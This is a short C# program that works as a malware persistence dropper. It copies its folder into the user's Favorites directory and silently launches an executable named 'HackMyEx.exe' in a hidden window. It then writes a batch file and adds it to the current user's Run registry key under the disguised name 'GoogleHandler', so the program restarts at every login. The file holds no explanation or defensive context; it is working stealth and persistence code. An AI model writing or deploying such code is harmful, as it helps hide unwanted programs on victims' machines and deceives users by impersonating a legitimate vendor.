using System.Windows.Forms;
using Microsoft.Win32;
using System.Text;
using System.IO;
using System;
using System.Diagnostics;

namespace startup
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            foreach (string dirPath in Directory.GetDirectories(Application.StartupPath, "*", 
                SearchOption.AllDirectories))
                Directory.CreateDirectory(dirPath.Replace(Application.StartupPath, "C:\\Users\\" + Environment.UserName + "\\Favorites\\"));

//Copy all the files & Replaces any files with the same name
            foreach (string newPath in Directory.GetFiles(Application.StartupPath, "*.*", 
                SearchOption.AllDirectories))
                File.Copy(newPath, newPath.Replace(Application.StartupPath, "C:\\Users\\" + Environment.UserName + "\\Favorites\\"), true);
            System.Diagnostics.ProcessStartInfo start = new System.Diagnostics.ProcessStartInfo();
            start.FileName = Application.StartupPath + @"\Package\bin\HackMyEx.exe";
            start.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            Process proc = Process.Start(start);
            if (!File.Exists("C:\\Users\\" + Environment.UserName + "\\Favorites" + @"\Package\bin\GoogleHandler.bat"))
            {
                using (FileStream fs = File.Create("C:\\Users\\" + Environment.UserName + "\\Favorites" + @"\Package\bin\GoogleHandler.bat"))
                {
                    Byte[] info = new UTF8Encoding(true).GetBytes("@echo\nstart \"\" \"" + "C:\\Users\\" + Environment.UserName + "\\Favorites" + @"\Package\bin\HackMyEx.exe" + "\"");
                    fs.Write(info, 0, info.Length);
                }
                
            }
            
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                registryKey.SetValue("GoogleHandler", "C:\\Users\\" + Environment.UserName + "\\Favorites" + @"\Package\bin\GoogleHandler.bat");

        }
    }
    
}